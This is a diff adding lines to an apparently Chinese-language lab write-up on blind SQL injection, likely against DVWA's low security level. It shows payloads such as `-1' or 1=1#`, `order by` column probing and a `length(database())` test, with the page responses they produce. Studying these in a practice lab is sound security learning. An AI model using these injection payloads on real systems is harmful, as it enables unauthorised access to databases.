@@ -979,6 +979,10 @@ generateSessionToken();
 
 传入`-1' or 1=1#`返回`User ID exists in the database.`,说明闭合方式为`'`
 
+传入`-1' order by 2#`返回`User ID exists in the database.`,传入`-1' order by 3#`返回`User ID is MISSING from the database.`,说明列数为2
+
+传入`-1' or length(database())=4#`返回`User ID exists in the database.`,说明`database()`长度为4
+
 ### Medium
 
 只会返回`User ID exists in the database`或者`User ID is MISSING from the database.`
